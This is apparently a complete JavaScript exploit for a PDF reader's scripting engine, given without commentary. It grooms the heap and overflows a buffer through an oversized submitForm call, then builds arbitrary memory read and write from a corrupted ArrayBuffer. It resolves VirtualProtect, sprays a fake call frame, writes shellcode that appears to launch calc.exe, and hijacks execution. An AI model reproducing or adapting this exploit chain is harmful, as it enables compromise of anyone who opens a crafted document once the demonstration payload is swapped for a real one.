console.show()

function gc() {
    new ArrayBuffer(3 * 1024 * 1024 * 100);
}


var strRelUrlSize = 0x600;
var strConUrlSize = 0x800;

function createArrayBuffer(blocksize) {
    var arr = new ArrayBuffer(blocksize - 0x10);
    var u8 = new Uint8Array(arr);
    for (var i = 0; i < arr.byteLength; i++) {
        u8[i] = 0x41;
    }
    return arr;
}

var arrB = new Array(0xE0);
var sprayStr = unescape('%uFFFF%uFFFF%uFFFF%uFFFF%u0000') + unescape('%uFFFF').repeat((strRelUrlSize / 2) - 1 - 5);
for (var i = 0; i < arrB.length; i++) {
    arrB[i] = sprayStr.substr(0, (strRelUrlSize / 2) - 1).toUpperCase();
}

for (var i = 0x11; i < arrB.length; i += 10) {
    arrB[i] = null;
    arrB[i] = undefined;
}

var arrA = new Array(0x130);
for (var i = 0; i < arrA.length; i++) {
    arrA[i] = createArrayBuffer(strConUrlSize);
}
for (var i = 0x11; i < arrA.length; i += 10) {
    arrA[i] = null;
    arrA[i] = undefined;
}

gc();
app.alert("ready to trigger");

try {
    this.submitForm('a'.repeat(strRelUrlSize - 1));
} catch (err) { }

for (var i = 0; i < arrA.length; i++) {
    if (arrA[i] != null && arrA[i].byteLength == 0xFFFF) {
        app.alert("find corrupt ArrayBuffer1")
        var temp = new DataView(arrA[i]);
        temp.setInt32(0x7F0 + 0x8 + 0x4, 0xFFFFFFFF, true);
    }
}

for (var i = 0; i < arrA.length; i++) {
    if (arrA[i] != null && arrA[i].byteLength == -1) {
        var rw = new DataView(arrA[i]);
        corruptArrayBuffer = arrA[i];
        app.alert("find corrupt ArrayBuffer2");
    }
}

if (rw) {
    curChunkBlockOffset = rw.getUint8(0xFFFFFFED, true);
    BitMapBufOffset = curChunkBlockOffset * (strConUrlSize + 8) + 0x18
    for (var i = 0; i < 0x30; i += 4) {
        BitMapBufOffset += 4;
        signature = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
        if (signature == 0xF0E0D0C0) {
            BitMapBufOffset -= 0xC;
            BitMapBuf = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
            break;
        }
    }

    if (BitMapBuf) {
        StartAddr = BitMapBuf + BitMapBufOffset - 4;

        function readUint32(dataView, readAddr) {
            var offsetAddr = readAddr - StartAddr;
            if (offsetAddr < 0) {
                offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
            }
            return dataView.getUint32(offsetAddr, true);
        }

        function writeUint32(dataView, writeAddr, value) {
            var offsetAddr = writeAddr - StartAddr;
            if (offsetAddr < 0) {
                offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
            }
            return dataView.setUint32(offsetAddr, value, true);
        }

        app.alert(StartAddr);
        EScriptModAddr = readUint32(rw, readUint32(rw, StartAddr - 8) + 0xC) - 0x277548;
        VirtualProtectAddr = readUint32(rw, EScriptModAddr + 0x1B0060);

        var dataViewObjPtr = rw.getUint32(0xFFFFFFFF + 0x1 - 0x8, true);
        var dvShape = readUint32(rw, dataViewObjPtr);
        var dvShapeBase = readUint32(rw, dvShape);
        var dvShapeBaseClasp = readUint32(rw, dvShapeBase);

        var shellcode = [0x0082e8fc, 0x89600000, 0x64c031e5, 0x8b30508b, 0x528b0c52, 0x28728b14, 0x264ab70f, 0x3cacff31,
            0x2c027c61, 0x0dcfc120, 0xf2e2c701, 0x528b5752, 0x3c4a8b10, 0x78114c8b, 0xd10148e3, 0x20598b51,
            0x498bd301, 0x493ae318, 0x018b348b, 0xacff31d6, 0x010dcfc1, 0x75e038c7, 0xf87d03f6, 0x75247d3b,
            0x588b58e4, 0x66d30124, 0x8b4b0c8b, 0xd3011c58, 0x018b048b, 0x244489d0, 0x615b5b24, 0xff515a59,
            0x5a5f5fe0, 0x8deb128b, 0x8d016a5d, 0x0000b285, 0x31685000, 0xff876f8b, 0xb5f0bbd5, 0xa66856a2,
            0xff9dbd95, 0x7c063cd5, 0xe0fb800a, 0x47bb0575, 0x6a6f7213, 0xd5ff5300, 0x636c6163, 0x6578652e,
            0x00000000]

        var shellcodesize = shellcode.length * 4;

        var heapSegmentSize = 0x10000;
        heapSpray = new Array(0x8000);
        for (var i = 0; i < 0x8000; i++) {
            heapSpray[i] = new ArrayBuffer(heapSegmentSize - 0x10 - 0x8);
            var tmpDv = new DataView(heapSpray[i]);
            tmpDv.setUint32(0xFFA9, VirtualProtectAddr, true);
            tmpDv.setUint32(0xFFA9 + 0x4, StartAddr + 0x18, true);
            tmpDv.setUint32(0xFFA9 + 0x8, StartAddr + 0x18, true);
            tmpDv.setUint32(0xFFA9 + 0xC, shellcodesize, true);
            tmpDv.setUint32(0xFFA9 + 0x10, 0x40, true);
            tmpDv.setUint32(0xFFA9 + 0x14, StartAddr + 0x14, true);
        }

        for (var i = 0; i < shellcode.length; i++) {
            writeUint32(rw, StartAddr + 0x18 + i * 4, shellcode[i]);
        }

        writeUint32(rw, dvShapeBaseClasp + 0x10, EScriptModAddr + 0x105020);
        var foo = rw.execFlowHijack;
    }
}

